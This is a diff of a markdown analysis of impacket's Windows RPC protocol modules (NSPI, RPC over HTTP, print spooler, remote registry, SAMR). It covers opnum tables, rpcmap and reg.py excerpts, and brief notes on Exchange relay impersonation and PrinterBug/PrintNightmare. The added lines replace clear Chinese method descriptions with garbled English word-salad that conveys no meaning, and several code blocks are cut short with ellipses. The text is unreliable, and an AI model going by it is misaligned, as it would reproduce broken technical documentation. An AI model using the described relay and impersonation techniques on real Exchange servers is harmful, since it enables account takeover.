+ 36 : (NetrEnumerateTrustedDomainsEx, NetrEnumerateTrustedDomainsExResponse),returns specifiedserver domainlist
+ 37 : (DsrAddressToSiteNamesExW, DsrAddressToSiteNamesExWResponse),
+ 38 : (DsrGetDcSiteCoverageW, DsrGetDcSiteCoverageWResponse),returnsdomain list
+ 39 : (NetrLogonSamLogonEx, NetrLogonSamLogonExResponse),
+ 40 : (DsrEnumerateDomainTrusts, DsrEnumerateDomainTrustsResponse),
+ 41 : (DsrDeregisterDnsHostRecords, DsrDeregisterDnsHostRecordsResponse),
+ 42 : (NetrServerTrustPasswordsGet, NetrServerTrustPasswordsGetResponse),returnsdomaincurrentpasswordclientthismethoddomainretrievescurrentpassword
+ 43 : (DsrGetForestTrustInformation, DsrGetForestTrustInformationResponse),retrievesspecifieddomain (DC)orspecified DC information
+ 44 : (NetrGetForestTrustInformation, NetrGetForestTrustInformationResponse),retrievesdomain information
+ 45 : (NetrLogonSamLogonWithFlags, NetrLogonSamLogonWithFlagsResponse),
+ 46 : (NetrServerGetTrustInfo, NetrServerGetTrustInfoResponse),
 # 48 : (DsrUpdateReadOnlyServerDnsRecords, DsrUpdateReadOnlyServerDnsRecordsResponse),
 # 49 : (NetrChainSetClientAttributes, NetrChainSetClientAttributesResponse),
 }
 ```
 
-### [MS-NSPI]/[MS-OXNSPI]nspi.py
+### [MS-NSPI / MS-OXNSPI] nspi.py — Exchange Address Book Protocol
 
 The Name Service Provider Interface (NSPI) protocol gives messaging clients a way to access and manipulate addressing data stored by the server.
 
@@ -2528,29 +2152,29 @@ The module implements the following methods:
 
 ```python
 OPNUMS = {
-    MS-OXNSPI / MS-NSPI 共有：
-    0  : (NspiBind, NspiBindResponse),方法启动客户端和服务器之间的会话
-    1  : (NspiUnbind, NspiUnbindResponse),方法破坏上下文句柄。
-    2  : (NspiUpdateStat, NspiUpdateStatResponse),方法更新表示表中位置的STAT块 ，以反映客户端请求的定位更改。
-    3  : (NspiQueryRows, NspiQueryRowsResponse),向客户端返回指定表中的一些行。尽管协议对服务器返回的最小行数没有限制或要求，实现应该返回尽可能多的行以提高服务器对客户端的可用性。
-    4  : (NspiSeekEntries, NspiSeekEntriesResponse),方法搜索并将特定表中的逻辑位置设置为大于或等于指定值的第一个条目。或者，它也可能返回有关表中行的信息。
+ MS-OXNSPI / MS-NSPI
+ 0 : (NspiBind, NspiBindResponse),methodclientserversession
+ 1 : (NspiUnbind, NspiUnbindResponse),methodonhandle
+ 2 : (NspiUpdateStat, NspiUpdateStatResponse),methodSTAT client
+    3  : (NspiQueryRows, NspiQueryRowsResponse),
+ 4 : (NspiSeekEntries, NspiSeekEntriesResponse),methodsetsasorspecifiedorreturns information aboutinformation
 #    5  : (NspiGetMatches, NspiGetMatchesResponse),
 #    6  : (NspiResortRestriction, NspiResortRestrictionResponse),
-    7  : (NspiDNToMId, NspiDNToMIdResponse),将一组DN映射 到一组最小条目 ID
-    8  : (NspiGetPropList, NspiGetPropListResponse),方法返回在指定对象上具有值的所有属性的列表
-    9  : (NspiGetProps, NspiGetPropsResponse),方法返回地址簿行，其中包含对象上存在的一组属性和值
-    10 : (NspiCompareMIds, NspiCompareMIdsResponse),方法比较最小条目 ID标识的两个对象在地址簿容器中的位置，并返回比较值
+    7  : (NspiDNToMId, NspiDNToMIdResponse),
+ 8 : (NspiGetPropList, NspiGetPropListResponse),methodreturnsinspecifiedobjectonalllist
+ 9 : (NspiGetProps, NspiGetPropsResponse),methodreturnscontainingobjectoningroup
+ 10 : (NspiCompareMIds, NspiCompareMIdsResponse),method IDobjectinreturns
 #    11 : (NspiModProps, NspiModPropsResponse),
-    12 : (NspiGetSpecialTable, NspiGetSpecialTableResponse),方法将特殊表的行返回给客户端。特殊表可以是通讯录层级表或地址创建表
-    13 : (NspiGetTemplateInfo, NspiGetTemplateInfoResponse),方法返回有关地址簿中模板对象的信息。
-    14 : (NspiModLinkAtt, NspiModLinkAttResponse),方法修改地址簿中特定行的特定属性的值。本协议只支持修改显示类型为DT_DISTLIST的通讯录对象的PidTagAddressBookMember 属性和通讯录的PidTagAddressBookPublicDelegates 属性的值显示类型为 DT_MAILUSER 的对象。
+ 12 : (NspiGetSpecialTable, NspiGetSpecialTableResponse),method returnsclientcanor
+ 13 : (NspiGetTemplateInfo, NspiGetTemplateInfoResponse),methodreturns information aboutobjectinformation
+ 14 : (NspiModLinkAtt, NspiModLinkAttResponse),methodmodifiesmodifiesasDT_DISTLISTobjectPidTagAddressBookMember PidTagAddressBookPublicDelegates as DT_MAILUSER object
 #    15 : (NspiDeleteEntries, NspiDeleteEntriesResponse),
-    16 : (NspiQueryColumns, NspiQueryColumnsResponse),方法返回服务器知道的所有属性的列表。它将此列表作为 proptags 数组返回
-    仅 MS-NSPI：
-    17 : (NspiGetNamesFromIDs, NspiGetNamesFromIDsResponse), 方法返回一组proptags的属性名称列表。
-    18 : (NspiGetIDsFromNames, NspiGetIDsFromNamesResponse),返回一组属性名称的proptags列表。
-    19 : (NspiResolveNames, NspiResolveNamesResponse),方法采用 8 位字符集中的一组字符串值，并对这些字符串执行ANR
-    20 : (NspiResolveNamesW, NspiResolveNamesWResponse),方法采用Unicode 字符集中的一组字符串值，并对这些字符串执行ANR（模糊名称解析）。
+ 16 : (NspiQueryColumns, NspiQueryColumnsResponse),methodreturnsserveralllistthislistas proptags groupreturns
+ MS-NSPI
+ 17 : (NspiGetNamesFromIDs, NspiGetNamesFromIDsResponse), methodreturnsgroupproptagsnamelist
+ 18 : (NspiGetIDsFromNames, NspiGetIDsFromNamesResponse),returnsgroupnameproptagslist
+ 19 : (NspiResolveNames, NspiResolveNamesResponse),method 8 groupANR
+ 20 : (NspiResolveNamesW, NspiResolveNamesWResponse),methodUnicode groupANRname
 }
 ```
 
@@ -2583,7 +2207,7 @@ class NSPIAttacks(Exchanger):
             ......
 ```
 
-### [MS-OXABREF]oxabref.py
+### [MS-OXABREF] oxabref.py — Address Book NSPI Referral Protocol
 
 The Address Book Name Service Provider Interface (NSPI) Referral Protocol redirects client address-book requests to the appropriate address book server. MS-OXNSPI is one of the protocols Outlook uses to access the address book; MS-OXABREF is its companion protocol, used to obtain the actual RPC server name, connect to it through the RPC Proxy, and then use the main protocol.
 
@@ -2591,14 +2215,14 @@ The module implements two methods:
 
 ```python
 OPNUMS = {
-    0   : (RfrGetNewDSA, RfrGetNewDSAResponse),方法返回NSPI 服务器或服务器数组的名称
-    1   : (RfrGetFQDNFromServerDN, RfrGetFQDNFromServerDNResponse),方法返回与传递的DN对应的服务器的域名系统 (DNS) FQDN
+ 0 : (RfrGetNewDSA, RfrGetNewDSAResponse),methodreturnsNSPI serverorservergroupname
+ 1 : (RfrGetFQDNFromServerDN, RfrGetFQDNFromServerDNResponse),methodreturnswithDNserverrealm (DNS) FQDN
 }
 ```
 
 No public exploit scripts or known vulnerabilities appear to involve this interface.
 
-### [MS-RPCH]rpch.py
+### [MS-RPCH] rpch.py — RPC over HTTP v2 (Exchange relay surface)
 
 Using HTTP or HTTPS as the transport for RPC — RPC over HTTP.
 
@@ -2628,13 +2252,13 @@ The module mainly implements the RPC over HTTP v2 functions:
 
 ```python
 def hCONN_A1(virtualConnectionCookie=EMPTY_UUID, outChannelCookie=EMPTY_UUID, receiveWindowSize=262144):
-#CONN/A1 RTS PDU 必须从客户端发送到 OUT 通道上的出站代理，以启动虚拟连接的建立。
+#CONN/A1 RTS PDU mustclient OUT on output
 def hCONN_B1(virtualConnectionCookie=EMPTY_UUID, inChannelCookie=EMPTY_UUID, associationGroupId=EMPTY_UUID):
-#CONN/B1 RTS PDU 必须从客户端发送到 IN 通道上的入站代理，以启动虚拟连接的建立。
+#CONN/B1 RTS PDU mustclient IN on entry
 def hFlowControlAckWithDestination(destination, bytesReceived, availableWindow, channelCookie):
-#FlowControlAckWithDestination RTS PDU 必须从任何接收方发送到其发送方
+#FlowControlAckWithDestination RTS PDU must
 def hPing():
-#Ping RTS PDU 应该从客户端发送到入站代理，并从出站代理发送到客户端。
+#Ping RTS PDU theclient entry outputclient
 ```
 
 It also implements an RPC client proxy class for talking to the RPC server.
@@ -2683,14 +2307,12 @@ examples/rpcmap.py calls mgmt's ifids over RPC over HTTP v2 to enumerate UUIDs a
 ```python
   def do(self):
         try:
-            # Connecting to MGMT interface
+            # (1) bind the MGMT interface first; hinq_if_ids returns every interface UUID registered by the target process
             self.__dce.bind(mgmt.MSRPC_UUID_MGMT)
-
-            # Retrieving interfaces UUIDs from the MGMT interface
             ifids = mgmt.hinq_if_ids(self.__dce)
 
-            # If -brute-uuids is set, bruteforcing UUIDs instead of parsing ifids
-            # We must do it after mgmt.hinq_if_ids to prevent a specified account from being locked out
+            # -brute-uuids: fall back to brute-forcing UUIDs when enumeration fails
+            # (kept after hinq_if_ids so repeated attempts don't lock out the specified account)
             if self.__brute_uuids:
                 self.bruteforce_uuids()
                 return
@@ -2699,23 +2321,18 @@ examples/rpcmap.py calls mgmt's ifids over RPC over HTTP v2 to enumerate UUIDs a
                 uuid.bin_to_uuidtup(ifids['if_id_vector']['if_id'][index]['Data'].getData())
                 for index in range(ifids['if_id_vector']['count'])
               )
+            uuidtups.add(('AFA8BD80-7D8A-11C9-BEF4-08002B102989', '1.0'))   # MGMT itself
 
-            # Adding MGMT interface itself
-            uuidtups.add(('AFA8BD80-7D8A-11C9-BEF4-08002B102989', '1.0'))
-
+            # (2) print each UUID: KNOWN_PROTOCOLS / KNOWN_UUIDS resolve protocol and provider names
             for tup in sorted(uuidtups):
                 self.handle_discovered_tup(tup)
-                ........
+                ......
+
 def handle_discovered_tup(self, tup):
+        # KNOWN_UUIDS hits print the Provider; optionally brute-force versions / opnums
         if tup[0] in epm.KNOWN_PROTOCOLS:
             print("Protocol: %s" % (epm.KNOWN_PROTOCOLS[tup[0]]))
-        else:
-            print("Procotol: N/A")
-
-        if uuid.uuidtup_to_bin(tup)[: 18] in KNOWN_UUIDS:
-            print("Provider: %s" % (KNOWN_UUIDS[uuid.uuidtup_to_bin(tup)[:18]]))
-        else:
-            print("Provider: N/A")
+        ......
 
         print("UUID: %s v%s" % (tup[0], tup[1]))
 
@@ -2730,7 +2347,6 @@ def handle_discovered_tup(self, tup):
                     print("Listening: False")
                 else:
                     raise
-        print()
 ```
 
 Since `/Rpc/*` is plain HTTP/HTTPS, it can be relayed: once authentication is bypassed at `/Rpc/RpcProxy.dll`, any user can be impersonated and their mailbox operated over RPC over HTTP:
@@ -2740,7 +2356,7 @@ Since `/Rpc/*` is plain HTTP/HTTPS, it can be relayed: once authentication is by
 - Attach the `X-CommonAccessToken` header to impersonate the target user and gain admin on both Exchange servers;
 - Interact with Outlook Anywhere via the wire formats of [MS-OXCRPC](https://docs.microsoft.com/en-us/openspecs/exchange_server_protocols/ms-oxcrpc/137f0ce2-31fd-4952-8a7d-6c0b242e4b6a) and [MS-OXCROPS](https://docs.microsoft.com/en-us/openspecs/exchange_server_protocols/ms-oxcrops/13af6911-27e5-4aa0-bb75-637b02d4f2ef) over MS-RPCH ......
 
-### [MS-PAR]par.py
+### [MS-PAR] par.py — Async Print Protocol (MS-RPRN enhanced)
 
 The Print System Asynchronous Remote Protocol defines the exchange of print-job-processing and print-system-management information between print clients and print servers; it is the asynchronous, enhanced successor of [MS-RPRN], providing stronger authentication on RPC calls.
 
@@ -2748,13 +2364,13 @@ The module implements the following methods:
 
 ```python
 OPNUMS = {
-    0  : (RpcAsyncOpenPrinter, RpcAsyncOpenPrinterResponse),指定打印机、端口、打印作业或打印服务器的句柄。客户端使用此方法获取远程计算机上现有打印机的打印句柄。
+ 0 : (RpcAsyncOpenPrinter, RpcAsyncOpenPrinterResponse),specifiedprintprintorprintserverhandleclientthismethodobtainsonprintprinthandle
     #1  : (RpcAsyncAddPrinter, RpcAsyncAddPrinterResponse),
-    20 : (RpcAsyncClosePrinter, RpcAsyncClosePrinterResponse),关闭先前由RpcAsyncOpenPrinter或RpcAsyncAddPrinter打开的打印机、服务器、作业或端口对象的句柄。
-    38 : (RpcAsyncEnumPrinters, RpcAsyncEnumPrintersResponse),枚举可用的本地打印机、指定打印服务器上的打印机、指定域中的打印机或打印提供程序。
-    39 : (RpcAsyncAddPrinterDriver, RpcAsyncAddPrinterDriver),在指定的打印服务器上安装指定的本地或远程打印机驱动程序，并链接配置、数据和驱动程序文件。
-    40 : (RpcAsyncEnumPrinterDrivers, RpcAsyncEnumPrinterDriversResponse),枚举安装在指定打印服务器上的打印机驱动程序
-    41 : (RpcAsyncGetPrinterDriverDirectory, RpcAsyncGetPrinterDriverDirectoryResponse)检索指定打印服务器上打印机驱动程序目录的路径。
+ 20 : (RpcAsyncClosePrinter, RpcAsyncClosePrinterResponse),closesRpcAsyncOpenPrinterorRpcAsyncAddPrinteropensprintserverorobjecthandle
+ 38 : (RpcAsyncEnumPrinters, RpcAsyncEnumPrintersResponse),enumeratesprintspecifiedprintserveronprintspecifieddomainprintorprint
+ 39 : (RpcAsyncAddPrinterDriver, RpcAsyncAddPrinterDriver),inspecifiedprintserveronspecifiedorprintdriverdriver
+ 40 : (RpcAsyncEnumPrinterDrivers, RpcAsyncEnumPrinterDriversResponse),enumeratesinspecifiedprintserveronprintdriver
+ 41 : (RpcAsyncGetPrinterDriverDirectory, RpcAsyncGetPrinterDriverDirectoryResponse)retrievesspecifiedprintserveronprintdriver
 }
 ```
 
@@ -2762,7 +2378,7 @@ OPNUMS = {
 
 No public exploit scripts or known vulnerabilities appear to involve this interface.
 
-### [MS-RPRN]rprn.py
+### [MS-RPRN] rprn.py — Print System Protocol (PrinterBug / PrintNightmare)
 
 The Print System Remote Protocol supports synchronous printing and spooler operations between client and server, including print-job control and print-system administration. Its enhanced replacement is specified in [MS-PAR], which provides a higher level of authentication on client/server RPC calls.
 
@@ -2772,28 +2388,28 @@ Let's first look at which interface methods the module implements:
 
 ```python
 OPNUMS = {
-    0  : (RpcEnumPrinters, RpcEnumPrintersResponse),枚举可用的打印机、打印服务器、域或打印提供程序。
-    1  : (RpcOpenPrinter, RpcOpenPrinterResponse),检索打印机、端口、端口监视器、打印作业或打印服务器的句柄。
-    10 : (RpcEnumPrinterDrivers, RpcEnumPrinterDriversResponse),枚举安装在指定打印服务器上的打印机驱动程序。
-    12 : (RpcGetPrinterDriverDirectory, RpcGetPrinterDriverDirectoryResponse),检索打印机驱动程序目录的路径。
-    29 : (RpcClosePrinter, RpcClosePrinterResponse),关闭打印机对象、服务器对象、作业对象或端口对象的句柄。
+ 0 : (RpcEnumPrinters, RpcEnumPrintersResponse),enumeratesprintprintserverdomainorprint
+ 1 : (RpcOpenPrinter, RpcOpenPrinterResponse),retrievesprintprintorprintserverhandle
+ 10 : (RpcEnumPrinterDrivers, RpcEnumPrinterDriversResponse),enumeratesinspecifiedprintserveronprintdriver
+ 12 : (RpcGetPrinterDriverDirectory, RpcGetPrinterDriverDirectoryResponse),retrievesprintdriver
+ 29 : (RpcClosePrinter, RpcClosePrinterResponse),closesprintobjectserverobjectobjectorobjecthandle
     
     
     
-    65 : (RpcRemoteFindFirstPrinterChangeNotificationEx, RpcRemoteFindFirstPrinterChangeNotificationExResponse), 创建一个远程更改通知对象，监视打印机对象的更改，并使用 RpcRouterReplyPrinter 或 RpcRouterReplyPrinterEx 将更改通知发送到打印客户端。服务端处理流程：
-    # 1. 创建并初始化一个通知对象，用于捕获用户请求的通知设置。
-    # 2. 创建并初始化一个返回客户端的通知通道，服务器必须通过该通道传递更改通知。这必须通过在由 pszLocalMachine 指向的名称指定的客户端上调用 RpcReplyOpenPrinter 来完成。
-    # 3. 将通知对象与 hPrinter 的上下文相关联。
-    # 4. 执行完上述步骤后，服务器应该将客户端添加到打印机对象或服务器对象的通知客户端列表中；当对象发生变化时，使用 RpcRouterReplyPrinter 或 RpcRouterReplyPrinterEx 通知客户端。
-    # 5. 通知方法的选择不取决于通知请求使用的是 RpcRemoteFindFirstPrinterChangeNotification 还是其 Ex 版本，而取决于通知能否单独用 RpcRouterReplyPrinter 的 fdwFlags 参数表达，或是否需要 RpcRouterReplyPrinterEx 的附加参数提供额外信息。
-    # 6. 返回操作的状态。
+ 65 : (RpcRemoteFindFirstPrinterChangeNotificationEx, RpcRemoteFindFirstPrinterChangeNotificationExResponse), creates aobjectprintobject RpcRouterReplyPrinter or RpcRouterReplyPrinterEx printclient
+ # 1. objectused forusersets
+ # 2. returnsclientservermustthemustin pszLocalMachine namespecifiedclienton RpcReplyOpenPrinter
+ # 3. objectwith hPrinter on
+ # 4. onservertheclientaddsprintobjectorserverobjectclientlistobject RpcRouterReplyPrinter or RpcRouterReplyPrinterEx client
+ # 5. methodnot RpcRemoteFindFirstPrinterChangeNotification Ex RpcRouterReplyPrinter fdwFlags or RpcRouterReplyPrinterEx information
+ # 6. returns
     
     
     
     
     
-    69 : (RpcOpenPrinterEx, RpcOpenPrinterExResponse),检索打印机、端口、端口监视器、打印作业或打印服务器的句柄。
-    89 : (RpcAddPrinterDriverEx, RpcAddPrinterDriverExResponse), 在打印服务器上安装打印机驱动程序。功能类似于 RpcAddPrinterDriver，还可指定驱动升级、降级、仅复制较新文件、无视时间戳复制所有文件等选项。
+ 69 : (RpcOpenPrinterEx, RpcOpenPrinterExResponse),retrievesprintprintorprintserverhandle
+ 89 : (RpcAddPrinterDriverEx, RpcAddPrinterDriverExResponse), inprintserveronprintdriver RpcAddPrinterDriverspecifieddrivertimestampall
 }
 ```
 
@@ -2874,7 +2490,7 @@ def main(dce, pDriverPath, share, handle=NULL):
             pass
 ```
 
-### [MS-RRP]rrp.py
+### [MS-RRP] rrp.py — Remote Registry Operations (reg.py foundation)
 
 The Windows Remote Registry Protocol is a client/server protocol based on [RPC](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rrp/261b039d-95d9-4749-9680-db1851d03945#gt_8a7f6700-8311-45bc-af10-82e10accd331), used to remotely administer hierarchical **data stores** such as the [Windows registry](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rrp/261b039d-95d9-4749-9680-db1851d03945#gt_5ae1b1fd-a770-4028-b1ca-bcc8fa9bcf0a). The protocol is exercised by examples/reg.py — a remote-registry tool over the MSRPC interface aiming to mirror Windows' reg.exe.
 
@@ -2882,39 +2498,39 @@ The module implements the following methods:
 
 ```python
 OPNUMS = {
- 0 : (OpenClassesRoot, OpenClassesRootResponse),由客户端调用。作为响应，服务器打开HKEY_CLASSES_ROOT 预定义键。
- 1 : (OpenCurrentUser, OpenCurrentUserResponse),由客户端调用。作为响应，服务器打开 HKEY_CURRENT_USER 键的句柄。服务器必须确定 HKEY_USERS 的哪个子键是映射到 HKEY_CURRENT_USER 的正确键
- 2 : (OpenLocalMachine, OpenLocalMachineResponse),由客户端调用。作为响应，服务器打开HKEY_LOCAL_MACHINE预定义注册表项的句柄
- 3 : (OpenPerformanceData, OpenPerformanceDataResponse),由客户端调用。作为响应，服务器打开HKEY_PERFORMANCE_DATA 预定义键的句柄。HKEY_PERFORMANCE_DATA 预定义键用于仅使用BaseRegQueryInfoKey、 BaseRegQueryValue、BaseRegEnumValue和BaseRegCloseKey 方法从注册表服务器检索性能信息
- 4 : (OpenUsers, OpenUsersResponse),由客户端调用。作为响应，服务器打开HKEY_USERS预定义注册表项的句柄
- 5 : (BaseRegCloseKey, BaseRegCloseKeyResponse),由客户端调用。作为响应，服务器销毁（关闭）指定注册表项的句柄
- 6 : (BaseRegCreateKey, BaseRegCreateKeyResponse),由客户端调用。作为响应，服务器创建指定的注册表项并返回新创建的注册表项的句柄。如果注册表项已存在于注册表中，则打开并返回现有项的句柄。
- 7 : (BaseRegDeleteKey, BaseRegDeleteKeyResponse),由客户端调用。作为响应，服务器删除指定的子项
- 8 : (BaseRegDeleteValue, BaseRegDeleteValueResponse),由客户端调用。作为响应，服务器从指定的注册表项中删除命名值
- 9 : (BaseRegEnumKey, BaseRegEnumKeyResponse),枚举子项。作为响应，服务器返回请求的子项
-10 : (BaseRegEnumValue, BaseRegEnumValueResponse),由客户端调用。作为响应，服务器枚举指定注册表项的指定索引处的值
-11 : (BaseRegFlushKey, BaseRegFlushKeyResponse),由客户端调用。作为响应，服务器将hKey参数指示的所有子键和键值写入注册表数据的后备存储
-12 : (BaseRegGetKeySecurity, BaseRegGetKeySecurityResponse),由客户端调用。作为响应，服务器返回保护指定的打开注册表项的安全描述符的副本
-13 : (BaseRegLoadKey, BaseRegLoadKeyResponse),由客户端调用。作为响应，服务器从文件中加载键、子键和值数据，并将数据插入到注册表层次结构中。
- 15 : (BaseRegOpenKey, BaseRegOpenKeyResponse),由客户端调用。作为响应，服务器打开指定的注册表项进行访问并返回一个句柄
- 16 : (BaseRegQueryInfoKey, BaseRegQueryInfoKeyResponse),由客户端调用。作为响应，服务器返回指定注册表项句柄对应的相关信息
-17 : (BaseRegQueryValue, BaseRegQueryValueResponse),由客户端调用。作为响应，服务器返回与指定注册表打开键的命名值关联的数据。如果未指定值名称，则服务器返回与指定注册表 打开键的默认值关联的数据。
- 18 : (BaseRegReplaceKey, BaseRegReplaceKeyResponse),由客户端调用。服务器将指定注册表项及其子项的后备文件替换为指定文件；系统下次启动后，该项及其子项将使用指定文件中的值。
-19 : (BaseRegRestoreKey, BaseRegRestoreKeyResponse),服务器读取指定文件中的注册表信息并将其复制到指定的键上。注册表信息采用键和多级子键的形式。
-20 : (BaseRegSaveKey, BaseRegSaveKeyResponse),服务器将指定的键、子键和值保存 到一个新文件中
-21 : (BaseRegSetKeySecurity, BaseRegSetKeySecurityResponse),服务器设置保护指定的开放注册表项的安全描述符
-22 : (BaseRegSetValue, BaseRegSetValueResponse),服务器为注册表项的指定值设置数据
- 23 : (BaseRegUnLoadKey, BaseRegUnLoadKeyResponse),服务器卸载以注册表层次结构顶部为根、由指定的键、子键和值组成的子树（配置单元）。
+ 0 : (OpenClassesRoot, OpenClassesRootResponse),Called by the client. In response, the serveropensHKEY_CLASSES_ROOT
+ 1 : (OpenCurrentUser, OpenCurrentUserResponse),Called by the client. In response, the serveropens HKEY_CURRENT_USER handleservermust HKEY_USERS HKEY_CURRENT_USER
+ 2 : (OpenLocalMachine, OpenLocalMachineResponse),Called by the client. In response, the serveropensHKEY_LOCAL_MACHINEregistryhandle
+ 3 : (OpenPerformanceData, OpenPerformanceDataResponse),Called by the client. In response, the serveropensHKEY_PERFORMANCE_DATA handleHKEY_PERFORMANCE_DATA used forBaseRegQueryInfoKey BaseRegQueryValueBaseRegEnumValueBaseRegCloseKey methodregistryserverretrievesinformation
+ 4 : (OpenUsers, OpenUsersResponse),Called by the client. In response, the serveropensHKEY_USERSregistryhandle
+ 5 : (BaseRegCloseKey, BaseRegCloseKeyResponse),Called by the client. In response, the serverclosesspecifiedregistryhandle
+ 6 : (BaseRegCreateKey, BaseRegCreateKeyResponse),Called by the client. In response, the servercreates the specifiedregistryreturnsregistryhandleifregistryinregistrythenopensreturnshandle
+ 7 : (BaseRegDeleteKey, BaseRegDeleteKeyResponse),Called by the client. In response, the serverdeletes the specified
+ 8 : (BaseRegDeleteValue, BaseRegDeleteValueResponse),Called by the client. In response, the serverspecifiedregistrydeletes
+ 9 : (BaseRegEnumKey, BaseRegEnumKeyResponse),enumeratesasserverreturns
+10 : (BaseRegEnumValue, BaseRegEnumValueResponse),Called by the client. In response, the serverenumeratesspecifiedregistryspecified
+11 : (BaseRegFlushKey, BaseRegFlushKeyResponse),Called by the client. In response, the serverhKeyall entryregistry
+12 : (BaseRegGetKeySecurity, BaseRegGetKeySecurityResponse),Called by the client. In response, the serverreturnsspecifiedopensregistry
+13 : (BaseRegLoadKey, BaseRegLoadKeyResponse),Called by the client. In response, the server entryregistry
+ 15 : (BaseRegOpenKey, BaseRegOpenKeyResponse),Called by the client. In response, the serveropens the specifiedregistryreturns ahandle
+ 16 : (BaseRegQueryInfoKey, BaseRegQueryInfoKeyResponse),Called by the client. In response, the serverreturns the specifiedregistryhandleinformation
+17 : (BaseRegQueryValue, BaseRegQueryValueResponse),Called by the client. In response, the serverreturnswithspecifiedregistryopensifspecifiednamethenserverreturnswithspecifiedregistry opens
+ 18 : (BaseRegReplaceKey, BaseRegReplaceKeyResponse),
+19 : (BaseRegRestoreKey, BaseRegRestoreKeyResponse),serverspecifiedregistryinformationspecifiedonregistryinformation
+20 : (BaseRegSaveKey, BaseRegSaveKeyResponse),serverspecified
+21 : (BaseRegSetKeySecurity, BaseRegSetKeySecurityResponse),serversetsspecifiedregistry
+22 : (BaseRegSetValue, BaseRegSetValueResponse),serverasregistryspecifiedsets
+ 23 : (BaseRegUnLoadKey, BaseRegUnLoadKeyResponse),serverregistryasspecifiedgroup
 
-（BaseRegUnLoadKey 的设计用途见本节代码块后的补充说明）
-26 : (BaseRegGetVersion, BaseRegGetVersionResponse),服务器返回远程注册 服务器的版本。客户端和服务器使用 BaseRegGetVersion 方法来确定远程注册表服务器是否同时支持 32 位和 64 位密钥命名空间。
-27 : (OpenCurrentConfig, OpenCurrentConfigResponse),服务器尝试打开HKEY_CURRENT_CONFIG 预定义键的句柄
-29 : (BaseRegQueryMultipleValues, BaseRegQueryMultipleValuesResponse),服务器返回与指定注册表项关联的客户端指定值名称列表的类型和数据。
-31 : (BaseRegSaveKeyEx, BaseRegSaveKeyExResponse),服务器将指定的键、子键和值保存到一个新文件中。BaseRegSaveKeyEx 方法接受确定保存的键或值的格式的标志。
-32 : (OpenPerformanceText, OpenPerformanceTextResponse),服务器打开HKEY_PERFORMANCE_TEXT 预定义键的句柄。HKEY_PERFORMANCE_TEXT预定义键用于仅使用BaseRegQueryInfoKey、 BaseRegQueryValue、BaseRegEnumValue和BaseRegCloseKey 方法从注册表服务器检索性能信息。
-33 : (OpenPerformanceNlsText, OpenPerformanceNlsTextResponse),服务器打开HKEY_PERFORMANCE_NLSTEXT 预定义键的句柄。HKEY_PERFORMANCE_NLSTEXT 预定义键用于仅使用BaseRegQueryInfoKey、 BaseRegQueryValue、BaseRegEnumValue和BaseRegCloseKey 方法从注册表服务器检索性能信息。
-34 : (BaseRegQueryMultipleValues2, BaseRegQueryMultipleValues2Response),服务器返回与指定注册表项关联的客户端指定值名称列表的类型和数据。
- 35 : (BaseRegDeleteKeyEx, BaseRegDeleteKeyExResponse),服务器删除指定的注册表项
+BaseRegUnLoadKey
+26 : (BaseRegGetVersion, BaseRegGetVersionResponse),serverreturns serverclientserver BaseRegGetVersion method toregistryserver 32 64
+27 : (OpenCurrentConfig, OpenCurrentConfigResponse),serveropensHKEY_CURRENT_CONFIG handle
+29 : (BaseRegQueryMultipleValues, BaseRegQueryMultipleValuesResponse),serverreturnswithspecifiedregistryclientspecifiednamelist
+31 : (BaseRegSaveKeyEx, BaseRegSaveKeyExResponse),serverspecifiedBaseRegSaveKeyEx methodor
+32 : (OpenPerformanceText, OpenPerformanceTextResponse),serveropensHKEY_PERFORMANCE_TEXT handleHKEY_PERFORMANCE_TEXTused forBaseRegQueryInfoKey BaseRegQueryValueBaseRegEnumValueBaseRegCloseKey methodregistryserverretrievesinformation
+33 : (OpenPerformanceNlsText, OpenPerformanceNlsTextResponse),serveropensHKEY_PERFORMANCE_NLSTEXT handleHKEY_PERFORMANCE_NLSTEXT used forBaseRegQueryInfoKey BaseRegQueryValueBaseRegEnumValueBaseRegCloseKey methodregistryserverretrievesinformation
+34 : (BaseRegQueryMultipleValues2, BaseRegQueryMultipleValues2Response),serverreturnswithspecifiedregistryclientspecifiednamelist
+ 35 : (BaseRegDeleteKeyEx, BaseRegDeleteKeyExResponse),serverdeletes the specifiedregistry
 }
 ```
 
@@ -2925,7 +2541,7 @@ examples/reg.py implements remote registry CRUD via the rrp module's methods:
 ```python
 # eg./examples/reg.py
 def query(self, dce, keyName):
-        # Let's strip the root key
+        # (1) split root key and subkey: HKLM/HKU/HKCR map to different predefined key handles
         try:
             rootKey = keyName.split('\\')[0]
             subKey = '\\'.join(keyName.split('\\')[1:])
@@ -2943,35 +2559,31 @@ def query(self, dce, keyName):
 
         hRootKey = ans['phKey']
 
+        # (2) open the subkey -> query values / enumerate subkeys / recursive walk (output logic of -v/-ve/-s omitted)
         ans2 = rrp.hBaseRegOpenKey(dce, hRootKey, subKey,
                                    samDesired=rrp.MAXIMUM_ALLOWED | rrp.KEY_ENUMERATE_SUB_KEYS | rrp.KEY_QUERY_VALUE)
+        ......
 
         if self.__options.v:
-            print keyName
             value = rrp.hBaseRegQueryValue(dce, ans2['phkResult'], self.__options.v)
-            print '\t' + self.__options.v + '\t' + self.__regValues.get(value[0], 'KEY_NOT_FOUND') + '\t', str(value[1])
-        elif self.__options.ve:
-            print keyName
-            value = rrp.hBaseRegQueryValue(dce, ans2['phkResult'], '')
-            print '\t' + '(Default)' + '\t' + self.__regValues.get(value[0], 'KEY_NOT_FOUND') + '\t', str(value[1])
+            ......
+
         elif self.__options.s:
             self.__print_all_subkeys_and_entries(dce, subKey + '\\', ans2['phkResult'], 0)
         else:
-            print keyName
             self.__print_key_values(dce, ans2['phkResult'])
             i = 0
             while True:
                 try:
+                    # (3) loop hBaseRegEnumKey to enumerate all subkeys until an exception is raised
                     key = rrp.hBaseRegEnumKey(dce, ans2['phkResult'], i)
-                    print keyName + '\\' + key['lpNameOut'][:-1]
+                    print(keyName + '\\' + key['lpNameOut'][:-1])
                     i += 1
                 except Exception:
                     break
-                    # ans5 = rrp.hBaseRegGetVersion(rpc, ans2['phkResult'])
-                    # ans3 = rrp.hBaseRegEnumKey(rpc, ans2['phkResult'], 0)
 ```
 
-### [MS-SAMR]samr.py
+### [MS-SAMR] samr.py — SAM Account Management (users / groups / passwords)
 
 The Security Account Manager (SAM) Remote Protocol (client-to-server) provides management functions for account stores or directories containing users and groups.
 
@@ -2981,104 +2593,107 @@ First let's see which interface methods impacket implements:
 
 ```python
